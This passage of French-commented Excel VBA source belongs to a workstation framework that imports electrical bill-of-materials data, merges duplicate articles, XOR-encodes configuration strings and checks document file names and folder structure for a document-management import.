        Regroupement_Sous_Ensembles Ligne_Debut
    ElseIf Regroup = 2 Then
        Regroupement_Global Ligne_Debut
    End If
    
    With ThisWorkbook.Sheets(shMateriels)
        frmImportXelec.txtDesignErr = Application.WorksheetFunction.CountIf(.Range("MatDesignation"), Epure_Designation(IniCls.ReadStringIniLangage("MsgFWK", "MsgDesignAbsent")))
        frmImportXelec.txtRefFabErr = Application.WorksheetFunction.CountIf(.Range("MatRefFournisseur"), Epure_Designation(IniCls.ReadStringIniLangage("MsgFWK", "MsgRefAbsent")))
        frmImportXelec.txtNomFabErr = Application.WorksheetFunction.CountIf(.Range("MatNomFournisseur"), Epure_Designation(IniCls.ReadStringIniLangage("MsgFWK", "MsgNomFourAbsent")))
    End With
    
    Renumerotation_Numeros_Ordre vbNullString
    Format_Onglet shMateriels
    
    ThisWorkbook.Worksheets(shMateriels).Activate
    ThisWorkbook.Worksheets(shMateriels).Range("A1").Select
    frmImportXelec.lblFinImport.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine")
    
    Comptage_Articles_Par_Sous_Ensemble
    
    Application.ScreenUpdating = True
    
    Application.EnableEvents = True
End Sub


Sub Lire_data()
    SACIMMABEC = vbNullString
    Repere = vbNullString
    Design = vbNullString
    ref_fab = vbNullString
    nom_fab = vbNullString
    Qte = 0
    piece_rech = vbNullString
    Note = vbNullString
    
    If VBA.Len(data_xelec) > 277 Then
        NATURE = VBA.Mid(data_xelec, 15, 1)
        Tech = VBA.Mid(data_xelec, 16, 1)
        SACIMMABEC = VBA.Mid(data_xelec, 17, 10)
        Repere = VBA.Trim(Mid(data_xelec, 27, 8))
        Design = VBA.Trim(Mid(data_xelec, 54, 100))
        ref_fab = VBA.Trim(Mid(data_xelec, 154, 50))
        nom_fab = VBA.Trim(Mid(data_xelec, 204, 20))
     
        Qte = VBA.val(Mid(data_xelec, 224, 15))
        piece_rech = VBA.Mid(data_xelec, 277, 1)
        Note = VBA.Mid(data_xelec, 332, 15)
        
        If Design = vbNullString Then
            design_err = design_err + 1
            Design = IniCls.ReadStringIniLangage("MsgFWK", "MsgDesignAbsent") '"D|fffd|signation Absente"
            frmImportXelec.txtDesignErr = design_err
        End If
        
        If ref_fab = vbNullString Then
            ref_fab_err = ref_fab_err + 1
            frmImportXelec.txtRefFabErr = ref_fab_err
            ref_fab = IniCls.ReadStringIniLangage("MsgFWK", "MsgRefAbsent") '"R|fffd|f|fffd|rence Absente"
        End If
        
        If nom_fab = vbNullString Then
            nom_fab_err = nom_fab_err + 1
            frmImportXelec.txtNomFabErr = nom_fab_err
            nom_fab = IniCls.ReadStringIniLangage("MsgFWK", "MsgNomFourAbsent") '"Nom Fournisseur Absent"
        End If
    End If
End Sub


Sub Ecriture_Article_TDI(Ligne_Tdi As Long, No_Ordre As Long)
    With ThisWorkbook.Sheets(shMateriels)
        .Cells(Ligne_Tdi, .Range("MatNumeroOrdre").Column).Value = No_Ordre
        .Cells(Ligne_Tdi, .Range("MatRepere").Column).Value = Repere
        .Cells(Ligne_Tdi, .Range("MatNum_SSEN").Column).Value = num_ssen
        .Cells(Ligne_Tdi, .Range("MatSuf_SSEN").Column).Value = suf_ssen
        .Cells(Ligne_Tdi, .Range("MatNiveau").Column).Value = "A"
        .Cells(Ligne_Tdi, .Range("MatNature").Column).Value = NATURE
        .Cells(Ligne_Tdi, .Range("MatRefFournisseur").Column).Value = ref_fab
        .Cells(Ligne_Tdi, .Range("MatNomFournisseur").Column).Value = nom_fab
        .Cells(Ligne_Tdi, .Range("MatDesignation").Column).Value = Epure_Designation(Design)
        .Cells(Ligne_Tdi, .Range("MatQuantite").Column).Value = Qte
        .Cells(Ligne_Tdi, .Range("MatMabecPreDocumente").Column).Value = SACIMMABEC
        .Cells(Ligne_Tdi, .Range("MatObservation").Column).Value = Obs
        .Cells(Ligne_Tdi, .Range("MatNote").Column).Value = Note
        .Cells(Ligne_Tdi, .Range("MatPieceRechange").Column).Value = piece_rech
        .Cells(Ligne_Tdi, .Range("MatDocument").Column).Value = "SP"
        .Cells(Ligne_Tdi, .Range("MatTechnologie").Column).Value = Tech
        .Cells(Ligne_Tdi, .Range("MatDateModif").Column).Value = Date
    End With
                    
    Ligne_Tdi = Ligne_Tdi + 1
End Sub


Function Epure_Designation(Designation As String) As String
    'Supprime les doubles blanc
    While VBA.InStr(Designation, "  ") <> 0
        Designation = Replace(Designation, "  ", " ") 'Remplace les doubles blancs
    Wend
    Designation = VBA.UCase(Trim(Designation))
    Designation = Supprimer_Accents(Designation)
    
    Epure_Designation = Designation
End Function


Sub Regroupement_Sous_Ensembles(Ligne_Debut As Long)
    Dim Ligne_Fin As Long, Ligne As Long
    Dim Ref As String, FirstAddress As String, Msg As String
    Dim Rech As Object
    
    Msg = IniCls.ReadStringIniLangage("MsgFWK", "MsgRegroup")
    Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shMateriels))
    With ThisWorkbook.Sheets(shMateriels)
        Ligne = Ligne_Debut
        While Ligne <= Ligne_Fin
            frmImportXelec.lblFinImport.Caption = Msg & " " & Ligne & "/" & Ligne_Fin
            'frmImportXelec.Repaint
            DoEvents
            
            Ref = .Cells(Ligne, .Range("MatRefFournisseur").Column).Value
            If .Cells(Ligne, .Range("MatNiveau").Column).Value = "A" And Ref <> "X" Then
                'c'est un Article et pas un doublon
                Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:=Ref, LookAt:=xlWhole)
                If Not Rech Is Nothing Then
                    FirstAddress = Rech.Address
                    Do
                        'Meme R|fffd|f|fffd|rence, Fournisseur dans m|fffd|me Enveloppe (Sous-Ensemble)
                        If Rech.row > Ligne And _
                            .Cells(Ligne, .Range("MatNomFournisseur").Column).Value = .Cells(Rech.row, .Range("MatNomFournisseur").Column).Value And _
                            .Cells(Ligne, .Range("MatNum_SSEN").Column).Value = .Cells(Rech.row, .Range("MatNum_SSEN").Column).Value And _
                            .Cells(Ligne, .Range("MatSuf_SSEN").Column).Value = .Cells(Rech.row, .Range("MatSuf_SSEN").Column).Value Then
                            .Cells(Ligne, .Range("MatQuantite").Column).Value = VBA.val(.Cells(Ligne, .Range("MatQuantite").Column).Value) + VBA.val(.Cells(Rech.row, .Range("MatQuantite").Column).Value)
                            'Lignes |fffd| Effacer
                            .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value = "X"
                            'Effacer le Repere (Mn|fffd|monique)
                            .Cells(Ligne, .Range("MatRepere").Column).Value = vbNullString
                        End If
                        Set Rech = .Columns(.Range("MatRefFournisseur").Column).FindNext(Rech)
                    Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
                    Ligne = Ligne + 1
                End If
            Else
                Ligne = Ligne + 1 'c'est un Sous-Ensemble
            End If
        Wend
        
        Do
            'Enlever les lignes Marqu|fffd|es par un "X"
            Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:="X", LookAt:=xlWhole)
            If Not Rech Is Nothing Then .Rows(Rech.row).Delete Shift:=xlUp
        Loop Until Rech Is Nothing
    End With
    frmImportXelec.txtNbElement = Lastline(ThisWorkbook.Worksheets(shMateriels)) - Ligne_Debut + 1
End Sub

Sub Regroupement_Global(Ligne_Debut As Long)
    Dim Ligne_Fin As Long, Ligne As Long
    Dim Ref As String, FirstAddress As String, Msg As String
    Dim Rech As Object
    
    Msg = IniCls.ReadStringIniLangage("MsgFWK", "MsgRegroup")
    
    Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shMateriels))
    With ThisWorkbook.Sheets(shMateriels)
        Ligne = Ligne_Debut
        While Ligne <= Ligne_Fin
            frmImportXelec.lblFinImport.Caption = Msg & " " & Ligne & "/" & Ligne_Fin
            'frmImportXelec.Repaint
            DoEvents

            Ref = .Cells(Ligne, .Range("MatRefFournisseur").Column).Value
            If .Cells(Ligne, .Range("MatNiveau").Column).Value = "A" And Ref <> "X" Then
                'c'est un Article et pas un doublon
                Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:=Ref, LookAt:=xlWhole)
                If Not Rech Is Nothing Then
                    FirstAddress = Rech.Address
                    Do
                        'Meme R|fffd|f|fffd|rence, Fournisseur dans m|fffd|me Enveloppe (Sous-Ensemble)
                        If Rech.row > Ligne And _
                            .Cells(Ligne, .Range("MatNomFournisseur").Column).Value = .Cells(Rech.row, .Range("MatNomFournisseur").Column).Value Then
                            .Cells(Ligne, .Range("MatQuantite").Column).Value = VBA.val(.Cells(Ligne, .Range("MatQuantite").Column).Value) + VBA.val(.Cells(Rech.row, .Range("MatQuantite").Column).Value)
                            'Lignes |fffd| Effacer
                            .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value = "X"
                            'Effacer le Repere (Mn|fffd|monique)
                            .Cells(Ligne, .Range("MatRepere").Column).Value = vbNullString
                        End If
                        Set Rech = .Columns(.Range("MatRefFournisseur").Column).FindNext(Rech)
                    Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
                    Ligne = Ligne + 1
                End If
            Else
                Ligne = Ligne + 1 'c'est un Sous-Ensemble
            End If
        Wend
        
        Do
            'Enlever les Articles Marqu|fffd|s par un "X"
            Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:="X", LookAt:=xlWhole)
            If Not Rech Is Nothing Then .Rows(Rech.row).Delete Shift:=xlUp
        Loop Until Rech Is Nothing
        
        For Ligne = Lastline(ThisWorkbook.Worksheets(shMateriels)) To Ligne_Debut + 1 Step -1
            'Enlever les Sous-Ensembles sauf le premier avec suffixe "NE01"
            If .Cells(Ligne, .Range("MatNiveau").Column).Value = "S" Then .Rows(Ligne).Delete Shift:=xlUp Else .Cells(Ligne, .Range("MatSuf_SSEN").Column).Value = "NE01"
        Next
    End With
    frmImportXelec.txtNbElement = Lastline(ThisWorkbook.Worksheets(shMateriels)) - Ligne_Debut + 1
End Sub


Sub Comptage_Articles_Par_Sous_Ensemble()
    Const Articles_Max = 500 'Simon ne tol|fffd|re pas plus de 500 articles dans un Sous-Ensemble
    Dim Ligne As Long, Ligne_Fin As Long, Nb_Articles As Long
    Dim Limite As Boolean
    
    Limite = False
    Ligne = FirstLine(shMateriels) 'D|fffd|but du 1er Sous-Ensemble
    Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shMateriels))
    Nb_Articles = 0
    With ThisWorkbook.Sheets(shMateriels)
        Do Until Ligne >= Ligne_Fin
            If .Cells(Ligne, .Range("MatNiveau").Column).Value = "A" Then Nb_Articles = Nb_Articles + 1: If Nb_Articles > Articles_Max Then Limite = True Else Nb_Articles = 0
            Ligne = Ligne + 1
        Loop
    End With
    If Limite Then
        MsgCls.ShowMessage "MsgLimiteArticle", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical
    End If
End Sub
Attribute VB_Name = "Cde_Document"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "Cde_Nomenclature"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Cde_Simon"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "CryptClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.3 du 01/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe de Cryptage / D|fffd|cryptage des Infos |fffd| prot|fffd|ger
'[---------------------------------------------------------------------------

Option Explicit


Private Const Codekey = APP_DOMAIN '& APP_SIA


Public Sub Encrypt(strCodeKey As String)
    InputBox strCodeKey, "Cryptage", CryptCls.Encode(strCodeKey)
End Sub

Public Sub Decrypt(strCodeKey As String)
    InputBox strCodeKey, "D|fffd|cryptage", CryptCls.Decode(strCodeKey)
End Sub

Public Function Decode(DataIn As String) As String
    Dim lonDataPtr      As Long
    Dim strDataOut      As String
    Dim intXOrValue1    As Integer
    Dim intXOrValue2    As Integer

    For lonDataPtr = 1 To (VBA.Len(DataIn) / 2)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = VBA.val("&H" & (VBA.Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
        'The second value comes from the code key
        intXOrValue2 = VBA.Asc(VBA.Mid$(Codekey, ((lonDataPtr Mod VBA.Len(Codekey)) + 1), 1))
        
        strDataOut = strDataOut + VBA.Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
    Decode = strDataOut
End Function

Public Function Encode(DataIn As String) As String
    Dim lonDataPtr      As Long
    Dim strDataOut      As String
    Dim tempstring      As String
    Dim intXOrValue1    As Integer
    Dim intXOrValue2    As Integer

    For lonDataPtr = 1 To VBA.Len(DataIn)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = VBA.Asc(VBA.Mid$(DataIn, lonDataPtr, 1))
        'The second value comes from the code key
        intXOrValue2 = VBA.Asc(VBA.Mid$(Codekey, ((lonDataPtr Mod VBA.Len(Codekey)) + 1), 1))
        
        tempstring = VBA.Hex((intXOrValue1 Xor intXOrValue2))
        If VBA.Len(tempstring) = 1 Then tempstring = "0" & tempstring
        
        strDataOut = strDataOut + tempstring
    Next lonDataPtr
    Encode = strDataOut
End Function
Attribute VB_Name = "D_Codes_Nomenclature"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Codes Nomenclatures
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 01/10/2008
'[Version       : V1.0 du 01/10/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Codes Nomenclatures
'[---------------------------------------------------------------------------

Function Code_Dossier(Code As String) As Boolean
    'D0 DOSSIER PROJET
    'D1 DOSSIER D'ETUDE ET D'IMPLANTATION
    'D2 DOSSIER NOMENCLATURE
    'D3 DOSSIER MAINTENANCE
    'D4 DOSSIER MECANIQUE
    'D5 DOSSIER GEOMETRIE
    'D6 DOSSIER FLUIDE (HLPA)
    'D7 DOSSIER AUTRES NOTICES
    'D8 DOSSIER ELECTRIQUE
    'D9 DOSSIER SECURITE ET CONDITION DE TRAVAIL
    
    Dim W As Integer
    Dim Liste_Codes As Variant
    Liste_Codes = Array("D0", "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9")
    
    Code_Dossier = False
    For W = 0 To UBound(Liste_Codes)
        If Code = Liste_Codes(W) Then
            Code_Dossier = True
            Exit For
        End If
    Next
End Function

Function Code_Programme(Code As String) As Boolean
    'PA PROGRAMMES AUTOMATE
    'PB PROGRAMMES DE BASE
    'PC PROGRAMMES CAPTEUR ET SECURITE
    'PD REPERTOIRES DES CONFIGURATIONS DES IHM
    'PE PROGRAMMES PUPITRE D'EXPLOITATION
    'PF PROGRAMMES AFFICHEUR
    'PG PROGRAMMES VISSAGE
    'PH Sauvegarde du disque Dur des Pupitres IHM
    'PI IHM SOURCE (SOURCE DES ECRANS IHM)
    'PL PROGRAMMES APPLICATIF
    'PM PROGRAMMES MESURE
    'PN PROGRAMMES CDE NUMERIQUE
    'PP PROGRAMMES CARTE PROGRAMMEE
    'PR PROGRAMMES ROBOT
    'PS PROGRAMMES SEQUENCEUR
    'PV PROGRAMMES VARIATEUR
    'PX PROGRAMMES PIECE
    'PY PROGRAMMES PYROMETRIE
    'P- Tous les Programmes
    
    Dim W As Integer
    Dim Liste_Codes As Variant
    Liste_Codes = Array("PA", "PB", "PC", "PD", "PE", "PF", "PG", "PH", "PI", "PL", "PM", "PN", _
                        "PP", "PR", "PS", "PV", "PX", "PY", "P-")
    
    Code_Programme = False
    For W = 0 To UBound(Liste_Codes)
        If Code = Liste_Codes(W) Then
            Code_Programme = True
            Exit For
        End If
    Next
End Function
Attribute VB_Name = "Dico"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Documents"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Modifications de l'onglet Documents
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/09/2008
'[Version       : V1.0 du 25/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Modifications de l'onglet Documents
'[---------------------------------------------------------------------------

Private Sub Worksheet_Change(ByVal Target As Range)
    On Error GoTo Fin
    
    Application.EnableEvents = False
    
    If Target.Count <> 1 Then GoTo Fin  'Plusieurs cellules concern|fffd|es
    If Target.row < FirstLine(shDocuments) Then GoTo Fin
    If Target.Column < 2 Then GoTo Fin
    If Target.Column > 21 Then GoTo Fin
    If ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value <> "O" Then GoTo Fin

    Mise_A_Jour_Date_Modification Me, Target.row
    'Controle_Format_Cellule ThisWorkbook.Worksheets(shDocuments), Target.Row, Target.Column
    Controle_Format_Ligne ThisWorkbook.Worksheets(shDocuments), Target.row

Fin:
    Application.EnableEvents = True
    On Error GoTo 0
End Sub
Attribute VB_Name = "E_Import_Documentaire"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Ctrl_Ged - Import des Objets Documentaire
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/07/2008
'[Version       : V1.5 du 27/10/2009
'[---------------------------------------------------------------------------
'[Sujet: Ctrl_Ged - Import des Objets Documentaire
'[---------------------------------------------------------------------------

    'constantes de mise en forme du rapport
    Const outputCol_dossier = 1
    Const outputCol_fichier = 2
    Const outputCol_stuctOK = 3
    Const outputCol_planchesOK = 4
    Const outputCol_numero = 5
    Const outputCol_suffixe = 6
    Const outputCol_indice = 7
    Const outputCol_format = 8
    Const outputCol_numFolio = 9
    Const outputCol_nbFolios = 10
    Const outputCol_extension = 11
    Const outputCol_Taille = 13
    Const Taille_Max = 200  'Taille maxi dossier + Nom de Fichier

    'constantes fonctionnelles GEDTMI
    Const MaxFichiersDoc = 10
    Const MaxFichiersPlan = 100

    'Comptage des Anomalies
    Dim NbErrUnic       As Integer
    Dim NbErrStruct     As Integer
    Dim NbErrPlanche    As Integer
    
    Dim outputLine      As Long
    
    Type ListeAttributs
        numero As String
        Suffixe As String
        Indice As String
        Format As String
        numFolio As String
        nbFolios As String
        extension As String
        erreur As String
    End Type
    

'Import des Objets Documentaires |fffd| partir d'un CD ou d'un R|fffd|pertoire
Sub Import_Documentaire()
    Dim WorkDir As String   'r|fffd|pertoire de travail
    Dim wsTemp As Worksheet, wsCtrl_Ged As Worksheet
    Dim Result As Boolean
    
    'Affiche le but de la Fonction et une demande d'acceptation de son fonctionnement
    If MsgCls.ShowMessage("MsgCtrlGed", vbCrLf & vbCrLf, "MsgCtrlGedEtape", vbNullString, vbYesNo + vbQuestion) = vbYes Then
        ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
        GererConfiguration False
        'S|fffd|lectionnez le dossier |fffd| v|fffd|rifier (les sous-dossiers seront |fffd|galement trait|fffd|s) :
        WorkDir = SystemCls.GetFolderName(&H1, IniCls.ReadStringIniLangage("MsgFWK", "MsgSelectFolder"))
        If WorkDir = vbNullString Then End
        If Caractere_Interdit_Ged(WorkDir) Then MsgCls.ShowMessage "MsgCarInterdits", vbCrLf & WorkDir & vbCrLf & vbCrLf, "MsgCancel", vbNullString, vbOKOnly + vbCritical: Exit Sub
        
        ' On efface toutes les donn|fffd|es
        Set wsTemp = ThisWorkbook.Worksheets("Temp")
        wsTemp.Cells.Clear
        Set wsCtrl_Ged = ThisWorkbook.Worksheets(shCtrl_Ged)
        wsCtrl_Ged.Cells.Clear
        
        Result = ListFiles(wsTemp, wsCtrl_Ged, WorkDir)
        
        If Result Then
            '1 verification des fichiers
            VerifFiles wsCtrl_Ged, WorkDir
        
            '2 v|fffd|rification de l'unicit|fffd|
            VerifUnicite wsCtrl_Ged
        
            '3 verification de coh|fffd|rence
            VerifCoherence wsCtrl_Ged
        
            MiseEnFormeReport wsCtrl_Ged, WorkDir
            
            ThisWorkbook.Sheets(shCde_Document).Cells(11, 2).Value = VBA.Date & "-" & VBA.Time
        End If
        wsTemp.Cells.Clear
        ' On active tout ce qui doit l'|fffd|tre
        GererConfiguration True
    End If
End Sub


Function ListFiles(wsTemp As Worksheet, wsCtrl_Ged As Worksheet, WorkDir As String) As Boolean
    'Liste dans une nouvelle feuille Excel les fichiers du dossier sp|fffd|cifi|fffd|
    Dim Fichier As String, DirName As String, sousDossier As String
    Dim l As Long, i As Long
    Dim RepVide     As Boolean
    
    ListFiles = False
    Application.StatusBar = IniCls.ReadStringIniLangage("MsgFWK", "MsgListFolders") '06Liste des sous-dossiers..."

    ListSubFolders wsTemp, WorkDir
    
    'liste des fichiers
    With wsCtrl_Ged
        l = 1
        i = 1
        Do Until i > wsTemp.UsedRange.Rows.Count
            sousDossier = wsTemp.Cells(i, 1).Value
            Application.StatusBar = VBA.Left(IniCls.ReadStringIniLangage("MsgFWK", "MsgListFiles") & " " & sousDossier, 255) '"*07Liste tous les fichiers du dossier "
            DoEvents

            On Error GoTo Suite
            Fichier = VBA.Dir(sousDossier & "\*")
            If l <= .Rows.Count Then
                If Fichier = vbNullString Then 'Pas de Fichiers, existe t'il d'autres R|fffd|pertoires
                    RepVide = True
                    DirName = VBA.Dir(sousDossier & "\", vbDirectory Or vbHidden Or vbArchive Or vbReadOnly Or vbSystem)  ' Even if hidden, and so on.
                    Do While VBA.Len(DirName) > 0
                        'Ignore the current and encompassing directories.
                        If (DirName <> ".") And (DirName <> "..") Then RepVide = False: Exit Do
                        DirName = VBA.Dir()  ' Get next subdirectory.
                    Loop

                    If RepVide Then  'Dossier Vide
                        .Cells(l, 1).Value = "." & VBA.Right(sousDossier, VBA.Len(sousDossier) + 1 - VBA.Len(WorkDir))
                        .Cells(l, 1).Font.Name = "Courier New"
                        l = l + 1
                    End If
                Else
                    Do Until Fichier = vbNullString
                        .Cells(l, 1).Value = "." & VBA.Right(sousDossier, VBA.Len(sousDossier) + 1 - VBA.Len(WorkDir))
                        .Cells(l, 1).Font.Name = "Courier New"
                        .Cells(l, 2).Value = Fichier
                        .Cells(l, 20).Value = "'" & Date_Modif(sousDossier & "\" & Fichier)
                        .Cells(l, 2).Font.Name = "Courier New"
                        l = l + 1
                        Fichier = VBA.Dir()
                    Loop
                End If
            Else
                MsgCls.ShowMessage "MsgLimiteExcel", vbCrLf + vbCrLf, "MsgCancel", vbNullString, vbOKOnly + vbCritical
                Purge_Data shCtrl_Ged
                GoTo Fin
            End If
Suite:
            i = i + 1
        Loop
        .UsedRange.Sort Key1:=.Cells(1, outputCol_fichier), Order1:=xlAscending, Header:=xlNo
        .UsedRange.EntireColumn.AutoFit
        ListFiles = True
    End With
Fin:
    Application.StatusBar = False
    On Error GoTo 0
End Function


Function Date_Modif(Fichier As String) As String
    Dim fso As Object, Fic As Object
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set Fic = fso.GetFile(Fichier)
    Date_Modif = VBA.Format(Fic.dateLastModified, "dd/mm/yyyy")
    On Error GoTo 0
End Function


Sub ListSubFolders(wsTemp As Worksheet, SearchPath As String)
    Dim NumFiles    As Integer
    
    Application.Cursor = xlWait
    outputLine = 1
    WriteToOutput wsTemp, SearchPath
    NumFiles = FindFiles(wsTemp, SearchPath)
    Application.Cursor = xlNormal
End Sub


Sub WriteToOutput(wsTemp As Worksheet, data As String)
    wsTemp.Cells(outputLine, 1).Value = data
    outputLine = outputLine + 1
End Sub


Function FindFiles(wsTemp As Worksheet, path As String) As Integer
    Dim DirName As String, dirNames() As String, nDir As Integer, i As Integer, DirCount As Integer, tt As Integer
    Dim Mes As String
    
    On Error GoTo sysFileERR
    If VBA.Right(path, 1) <> "\" Then path = path & "\"
        
    'Search for subdirectories.
    nDir = 0
    ReDim dirNames(nDir)
    DirName = VBA.Dir(path, vbDirectory Or vbHidden Or vbArchive Or vbReadOnly Or vbSystem)  ' Even if hidden, and so on.
    Do Until VBA.Len(DirName) = 0
        'Ignore the current and encompassing directories.
        If (DirName <> ".") And (DirName <> "..") Then
        tt = VBA.GetAttr(path & DirName)
        tt = tt And vbDirectory
           'Check for directory with bitwise comparison.
           If VBA.GetAttr(path & DirName) And vbDirectory Then
              dirNames(nDir) = DirName
              DirCount = DirCount + 1
              nDir = nDir + 1
              ReDim Preserve dirNames(nDir)
              'List2.AddItem path & DirName ' Uncomment to list directories.
              WriteToOutput wsTemp, path & DirName
           End If
sysFileERRCont:
        End If
        DirName = VBA.Dir()  ' Get next subdirectory.
    Loop
    ' If there are sub-directories..
    If nDir > 0 Then
        ' Recursively walk into them
        i = 0
        Do Until i > nDir - 1
            FindFiles = FindFiles + FindFiles(wsTemp, path & dirNames(i) & "\")
            i = i + 1
        Loop
    End If
    
AbortFunction:
    FindFiles = DirCount
    Exit Function
sysFileERR:
    If VBA.Right(DirName, 4) = ".sys" Then
        Resume sysFileERRCont ' Known issue with pagefile.sys
    Else
        Mes = IniCls.ReadStringIniLangage("MsgFWK", "MsgErreur") & " : " & err.Number & " - " & VBA.Error(err.Number) + vbCrLf
        Mes = Mes & path & DirName + vbCrLf + vbCrLf
        Mes = Mes + IniCls.ReadStringIniLangage("MsgFWK", "MsgCheckFiles") 'V|fffd|rifier les caract|fffd|res composants le nom du fichier
        Mes = Mes + IniCls.ReadStringIniLangage("MsgFWK", "MsgUnicode")
        MsgBox Mes, vbCritical, "Unexpected Error ! " ' modif du 28-06-2006
        Resume AbortFunction
    End If
End Function


Sub VerifFiles(wsCtrl_Ged As Worksheet, WorkDir As String)
    'pour chaque nom de fichier list|fffd|, v|fffd|rifie sa structure
    Dim l As Long
    Dim Fichier As String, Mes As String
    Dim attribTable As ListeAttributs
    Dim NbErr As Integer, Long_Dossier As Integer, Long_Fichier As Integer
    
    Application.StatusBar = IniCls.ReadStringIniLangage("MsgFWK", "MsgCheckFiles") '"*10V|fffd|rifie la structure des noms de fichiers..."
    NbErrStruct = 0
    With wsCtrl_Ged
        For l = 1 To .UsedRange.EntireRow.Count

            Long_Dossier = VBA.Len(.Cells(l, outputCol_dossier).Value)
            Long_Fichier = VBA.Len(.Cells(l, outputCol_fichier).Formula) 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
            .Cells(l, outputCol_Taille).Value = Long_Dossier + Long_Fichier
            If Long_Dossier + Long_Fichier > Taille_Max Then
                .Cells(l, outputCol_Taille).Font.ColorIndex = 3    'rouge
            Else
                .Cells(l, outputCol_Taille).Font.ColorIndex = 10    'vert
            End If
            Mes = WorkDir
            Mes = Mes & .Cells(l, outputCol_dossier).Value & "\"
            '*******************
            'Lien sur le Dossier
            .Hyperlinks.Add Anchor:=.Range("N" & l), Address:=Mes, TextToDisplay:="'" & .Cells(l, outputCol_dossier).Value
            
            If Caractere_Interdit_Ged(.Cells(l, outputCol_dossier).Value) Then
                'v|fffd|rif des caract|fffd|res interdits dans les Noms de Dossiers
                .Cells(l, outputCol_stuctOK).Value = "KO"
                IndiqueErreur .Cells(l, outputCol_stuctOK), IniCls.ReadStringIniLangage("MsgFWK", "MsgCarInterdits") & ",Virgule" '"*39Le nom de fichier contient des caract|fffd|res non autoris|fffd|s
                NbErrStruct = NbErrStruct + 1
            
            ElseIf Long_Fichier > 0 Then
                Mes = Mes & .Cells(l, outputCol_fichier).Formula 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
                '*******************
                'Lien sur le fichier
                .Hyperlinks.Add Anchor:=.Range("O" & l), Address:=Mes, TextToDisplay:="'" & .Cells(l, outputCol_fichier).Formula 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
            
                Fichier = .Cells(l, outputCol_fichier).Formula 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
                attribTable = GetAttribItems(Fichier)
                If attribTable.erreur <> vbNullString Then
                    .Cells(l, outputCol_stuctOK).Value = "KO"
                    IndiqueErreur .Cells(l, outputCol_stuctOK), attribTable.erreur
                    NbErrStruct = NbErrStruct + 1
                Else
                    NbErr = 0
                    If Not VerifAttribut("numero", attribTable.numero, .Cells(l, outputCol_numero)) Then NbErr = NbErr + 1
                    If Not VerifAttribut("suffixe", attribTable.Suffixe, .Cells(l, outputCol_suffixe)) Then NbErr = NbErr + 1
                    If Not VerifAttribut("indice", attribTable.Indice, .Cells(l, outputCol_indice)) Then NbErr = NbErr + 1
                    If Not VerifAttribut("format", attribTable.Format, .Cells(l, outputCol_format)) Then NbErr = NbErr + 1
                    If Not VerifAttribut("numFolio", attribTable.numFolio, .Cells(l, outputCol_numFolio)) Then NbErr = NbErr + 1
